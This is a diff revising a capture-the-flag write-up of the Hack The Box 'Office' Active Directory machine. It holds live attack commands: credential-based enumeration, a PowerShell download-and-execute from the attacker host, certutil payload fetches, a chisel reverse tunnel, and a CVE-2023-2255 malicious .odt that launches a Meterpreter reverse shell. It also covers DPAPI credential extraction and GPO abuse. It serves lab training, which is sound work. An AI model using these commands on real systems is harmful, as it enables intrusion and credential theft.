@@ -373,7 +373,7 @@ SMB         10.10.11.3      445    DC               [+] OFFICE.HTB\dwolfe:H0lOgr
 - Since we have valid credentials for a domain user, we'll use `bloodhound-python`, a Python-based ingestor for BloodHound, to extract domain information for further analysis.
 
 ```bash
-sudo bloodhound-python -u 'tstark' -p 'playboy69' -d OFFICE.HTB -c all -ns 10.10.11.3
+sudo bloodhound-python -u 'dwolfe' -p 'H0lOgrams4reTakIng0Ver754!' -d OFFICE.HTB -c all -ns 10.10.11.3
 ```
 
 ![](/assets/images/HTB-Writeup-Office/Pasted image 20240619123841.png)
@@ -388,7 +388,11 @@ zip office_ad.zip *json
 
 ![](/assets/images/HTB-Writeup-Office/Pasted image 20240619124652.png)
 
-- Once the `json` files are uploaded, the domain is enumerated. Using the several queries from the `Pre-Built Analytics Queries` and inpeccionar el tab `Node Info` but had no luck
+- Once the  `json` files are uploaded, the domain is enumerated. I used several queries from the `Pre-Built Analytics Queries` and inspected the `Node Info` tab, but had no luck.
+
+
+
+
 
 ![](/assets/images/HTB-Writeup-Office/Pasted image 20240619130201.png)
 
@@ -412,24 +416,8 @@ SMB         10.10.11.3      445    DC               SOC Analysis    READ
 SMB         10.10.11.3      445    DC               SYSVOL          READ            Logon server share  
 ```
 
-- The pentester enumeró más a profundiad el `share` directory `SOC Analysis` with the tool `CrackMapExec`
+- The pentester further enumerated the shared directory `SOC Analysis` using the tool `smbmap`.
 
-```bash
-crackmapexec smb 10.10.11.3 -u dwolfe -p 'H0lOgrams4reTakIng0Ver754!' -d OFFICE.HTB --shares
-SMB         10.10.11.3      445    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:OFFICE.HTB) (signing:True) (SMBv1:False)
-SMB         10.10.11.3      445    DC               [+] OFFICE.HTB\dwolfe:H0lOgrams4reTakIng0Ver754! 
-SMB         10.10.11.3      445    DC               [+] Enumerated shares
-SMB         10.10.11.3      445    DC               Share           Permissions     Remark
-SMB         10.10.11.3      445    DC               -----           -----------     ------
-SMB         10.10.11.3      445    DC               ADMIN$                          Remote Admin
-SMB         10.10.11.3      445    DC               C$                              Default share
-SMB         10.10.11.3      445    DC               IPC$            READ            Remote IPC
-SMB         10.10.11.3      445    DC               NETLOGON        READ            Logon server share 
-SMB         10.10.11.3      445    DC               SOC Analysis    READ            
-SMB         10.10.11.3      445    DC               SYSVOL          READ            Logon server share  
-```
-
-- The pentester further enumerated the `SOC Analysis` share directory using the tool `CrackMapExec`.
 
 ```bash
 smbmap -u dwolfe -p 'H0lOgrams4reTakIng0Ver754!' -r 'SOC Analysis' -H 10.10.11.3
@@ -464,7 +452,7 @@ smbmap -u dwolfe -p 'H0lOgrams4reTakIng0Ver754!' -r 'SOC Analysis' -H 10.10.11.3
 ```
 
 
-- That's why he downloaded this file onto their attacker machine.
+- Noticing the existence of a `.pcap` file, that's why he downloaded this file onto their attacker machine.
 
 ```bash
 smbmap -u dwolfe -p 'H0lOgrams4reTakIng0Ver754!' -H 10.10.11.3 --download 'SOC Analysis/Latest-System-Dump-8fbc124d.pcap'
@@ -506,7 +494,14 @@ $krb5pa$18$<principal_name_here>$HASHCATDOMAIN.COM$<cipher_bytes_here>
 >**Second packet**
 >
 >![](/assets/images/HTB-Writeup-Office/Pasted image 20240619112617.png)
+>
  {: .prompt-info }
+
+
+>Tip: The essence of the `AS-REProasting Attack` is as follows: When you do not enforce `pre-authentication`, a malicious attacker can directly send a `dummy request for authentication`. The `KDC` will return an encrypted `TGT` and `TGS' Session Key` encrypted with the `user secret key`. It is evident that the encrypted `TGS' Session Key` is attractive to the attacker because it can brute-force it offline in order to discover the `user's secret`.
+>
+> If you want to see more, [rioasmara](https://rioasmara.com/author/rioasmara/) has a [post](https://rioasmara.com/2020/07/04/kerberoasting-as-req-pre-auth-vs-non-pre-auth/) where he compares the behavior when `PRE-AUTH` (**Kerberos preauthentication**) is enabled versus when it's not, showing packet captures in Wireshark.
+ {: .prompt-tip }
 
 
 - Visualizing the captured Kerberos traffic in Wireshark, we can identify the following fields in the second Kerberos packet:
@@ -524,16 +519,9 @@ $krb5pa$18$tstark$OFFICE.HTB$a16f4806da05760af63c566d566f071c5bb35d0a41445941761
 
 ![](/assets/images/HTB-Writeup-Office/Pasted image 20240619123145.png)
 
-- With this, the pentester observed that the user `tstark` is part of the `Registry Editors` group, similar to the domain user `ppotts`.
+- With this, the pentester observed once again the information provided by `BloodHound` for the user `tstark` and noticed that `tstark` is part of the `Registry Editors` group, as well as domain user `ppotts`.
 
 ![](/assets/images/HTB-Writeup-Office/Pasted image 20240619131543.png)
-
-- When you do not enforce pre-authentication, a malicious attacker can directly send a dummy request for authentication. The KDC will return an encrypted TGT and the attacker can brute force it offline.
-
-
-
->Comments: If you want to see more, [rioasmara](https://rioasmara.com/author/rioasmara/) has a [post](https://rioasmara.com/2020/07/04/kerberoasting-as-req-pre-auth-vs-non-pre-auth/) where he compares the behavior when `PRE-AUTH` (**Kerberos preauthentication**) is enabled versus when it's not, showing packet captures in Wireshark.
-{: .prompt-info }
 
 
 - The pentester has obtained new credentials (`tstark` : `playboy69`). Enumeration is an iterative process; however, this time access to the target via WinRM was unsuccessful, and no interesting files were found in SMB. Therefore, the pentester attempted to access the `admin` dashboard of Joomla with this new pair of credentials, but had no luck. Later, using the same password, the pentester tried the `administrator` username and successfully logged in!
@@ -561,7 +549,7 @@ powershell -c IEX(New-Object Net.WebClient).downloadString('http://10.10.14.69/I
 
 ![](/assets/images/HTB-Writeup-Office/Pasted image 20240619143857.png)
 
-- Since the pentester had credentials for the user `tstark`, he used [`RunasCs.exe`](https://github.com/antonioCoco/RunasCs/releases) to obtain a Meterpreter reverse shell.
+- Since the pentester had credentials for the user `tstark`, he used [`RunasCs.exe`](https://github.com/antonioCoco/RunasCs/releases) to obtain a Meterpreter reverse shell as the user `tstark`.
 
 
 ```shell
@@ -575,7 +563,7 @@ Saved as: revshmet.exe
 ```
 
 
-- He uploaded the files to the writable directory `c:\windows\tasks` using `certutil.exe` and granted `Full` privileges to the `Everyone` group for the executable `revshmet.exe`.
+- He uploaded the necessary files to the writable directory `c:\windows\tasks` using `certutil.exe` and granted `Full` privileges to the `Everyone` group for the executable `revshmet.exe`.
 
 ```shell
 PS C:\windows\tasks> certutil.exe -f -urlcache -split http://10.10.14.69/RunasCs.exe
@@ -604,7 +592,7 @@ cmd /c "icacls C:\windows\tasks\revshmet.exe  /grant Everyone:(F)"
 >![](/assets/images/HTB-Writeup-Office/Pasted image 20240619163017.png)
 {: .prompt-info }
 
-- With all that done, he executed `RunasCs.exe`, received the reverse shell, and was able to read `user.txt`.
+- With all that done, he executed `RunasCs.exe`, received the reverse shell as the user `tstark`, and was able to read `user.txt`.
 
 ```shell
 c:\windows\tasks\RunasCs.exe tstark playboy69 c:\windows\tasks\revshmet.exe
@@ -613,7 +601,7 @@ c:\windows\tasks\RunasCs.exe tstark playboy69 c:\windows\tasks\revshmet.exe
 ![](/assets/images/HTB-Writeup-Office/Pasted image 20240619163204.png)
 
 ## Shell as "ppotts" user 
-- After extensive enumeration, the pentester noticed that port `8083` was `LISTENING` on all interfaces, but this was not reported in the `nmap` scan, likely due to a firewall rule. Therefore, he decided to forward this port using `chisel.exe`.
+- After extensive enumeration, the pentester noticed that port `8083` was `LISTENING` on all interfaces, but this was not reported in the `nmap` scan. Therefore, he decided to forward this port using `chisel.exe`.
 
 
 - He uploaded the file `chisel_windows_amd64.exe` using the `upload` command of `meterpreter`.
@@ -636,13 +624,13 @@ c:\windows\tasks\chisel_windows_amd64.exe client 10.10.14.69:8050 R:8083:127.0.0
 chisel server -p 8050 --reverse
 ```
 
-- Given that port 8083 is accessible, the pentester inspected the website.
+- Given that port `8083` is accessible, the pentester inspected the website.
 
-- The pentester found it strange that uploading .odt files was allowed. After a quick search for recent vulnerabilities, they discovered CVE-2023-2255.
+- The pentester found it strange that uploading `.odt` files was allowed. After a quick search for recent vulnerabilities, he discovered `CVE-2023-2255`.
 
 ![](/assets/images/HTB-Writeup-Office/Pasted image 20240620003131.png)
 
-- The CVE affects versions of `LibreOffice prior to 6.3`, allowing command execution upon opening files without any alerts. This stems from inadequate access controls in editor components handling documents with 'floating frames' linked to external files. The pentester discovered the target was running `LibreOffice 5.2.6.2` and attempted to exploit this vulnerability
+- The CVE affects versions of `LibreOffice prior to 6.3`, allowing command execution upon opening files without any alerts. This stems from inadequate access controls in editor components handling documents with 'floating frames' linked to external files. The pentester discovered the target was running `LibreOffice 5.2.6.2` and due to the suggestive message indicating that a user would be reviewing the `resume` sent in the form `Job Application Submission`, he attempted to exploit this vulnerability
 
 ```shell
 powershell -c "Get-WmiObject -Class Win32_Product |  select Name, Version"
@@ -653,7 +641,7 @@ powershell -c "Get-WmiObject -Class Win32_Product |  select Name, Version"
 > Comments: If you want to learn more about this vulnerability, check out the repository of [Icare1337](https://github.com/Icare1337/LibreOffice_Tips_Bug_Bounty/commits?author=Icare1337) for [CVE-2023-2255](https://github.com/Icare1337/LibreOffice_Tips_Bug_Bounty/tree/main/CVE-2023-2255).
  {: .prompt-info }
 
-- [`elweth-sec`](https://github.com/elweth-sec) has an excellent [PoC](https://github.com/elweth-sec/CVE-2023-2255). The pentester used this PoC with the payload generated earlier using `msfvenom` (`revshmet.exe`), which would allow them to obtain a reverse shell.
+- [`elweth-sec`](https://github.com/elweth-sec) has an excellent [PoC](https://github.com/elweth-sec/CVE-2023-2255). The pentester used this PoC to generate a malicious `.odt` (`exploit.odt`) file, which will execute the payload generated earlier using `msfvenom` (`revshmet.exe`). This way, he would be able to obtain a reverse shell as the user who was reviewing the odt files.
 
 ```shell
 python3 CVE-2023-2255.py --cmd 'c:\windows\task\revshmet.exe' --output 'exploit.odt'
@@ -661,16 +649,18 @@ python3 CVE-2023-2255.py --cmd 'c:\windows\task\revshmet.exe' --output 'exploit.
 
 ![](/assets/images/HTB-Writeup-Office/Pasted image 20240619175337.png)
 
-- Then the pentester proceeded to upload the `exploit.odt` file to the target website located on port `8083`. Assuming there is a user reviewing the Job Application Submissions, the payload executed successfully. Great! The pentester received a reverse shell as the user `ppotts`.
+- Then the pentester proceeded to upload the `exploit.odt` file to the target website located on port `8083`. Assuming there is a user reviewing the Job Application Submissions, the payload executed successfully. After some time, great! The pentester received a reverse shell as another user named `ppotts`.
 
 ![](/assets/images/HTB-Writeup-Office/Pasted image 20240619175643.png)
 
 ![](/assets/images/HTB-Writeup-Office/Pasted image 20240619175817.png)
 
 ## GPO Abuse and **root.txt**
-- After extensive enumeration, the pentester executed `winpeasx64.exe` to thoroughly enumerate for any details that might have been overlooked. In doing so, they discovered the existence of `DPAPI Credentials file` and `DPAPI Master Keys`!!
+- After extensive enumeration, the pentester executed `winpeasx64.exe` to thoroughly enumerate for any details that might have been overlooked. In doing so, he discovered the existence of `DPAPI Credentials file` and `DPAPI Master Keys`!!
 
-> Comments: It's worth mentioning that the latest version of the tool [`SharpDPAPI`](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/SharpDPAPI.exe) is capable of extracting credentials protected by DPAPI.
+- There are different ways to read the `DPAPI Credentials file`, from manual to automated ways, in this case the pentester used the automated way.
+
+> Tip: It's worth mentioning that the latest version of the tool [`SharpDPAPI`](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/SharpDPAPI.exe) is capable of extracting credentials protected by DPAPI.
  {: .prompt-tip }
 - Upload `SharpDPAPI.exe`
 ```bash
@@ -768,7 +758,7 @@ SharpDPAPI completed in 00:00:00.2319211
 
 ![](/assets/images/HTB-Writeup-Office/Pasted image 20240619210210.png)
 
-- Great! The pentester obtained a new credential pair (`HHogan`:`H4ppyFtW183#`). Afterwards, they achieved a reverse shell as `HHogan` using the same `revshmet.exe` payload.
+- Great! The pentester obtained a new credential pair (`HHogan`:`H4ppyFtW183#`). Afterwards, he achieved a reverse shell as `HHogan` using the same `revshmet.exe` payload, which was executed by `RunasCs.exe`.
 
 ![](/assets/images/HTB-Writeup-Office/Pasted image 20240619213111.png)
 
@@ -780,7 +770,7 @@ SharpDPAPI completed in 00:00:00.2319211
 
 ![](/assets/images/HTB-Writeup-Office/Pasted image 20240620010523.png)
 
-- SharpGPOAbuse is a .NET tool that exploits user edit rights on a Group Policy Object (GPO) to compromise managed objects. Therefore, the pentester uploaded `SharpGPOAbuse.exe` to the target host in order to exploit it.
+- After searching for tools that allow this rights to be abused, he found `SharpGPOAbuse.exe`. `SharpGPOAbuse.exe` is a .NET tool that exploits user edit rights on a `Group Policy Object` (GPO) to compromise managed objects. Therefore, the pentester uploaded `SharpGPOAbuse.exe` to the target host in order to exploit it.
 
 ```bash
 upload SharpGPOAbuse.exe c:\\windows\\tasks
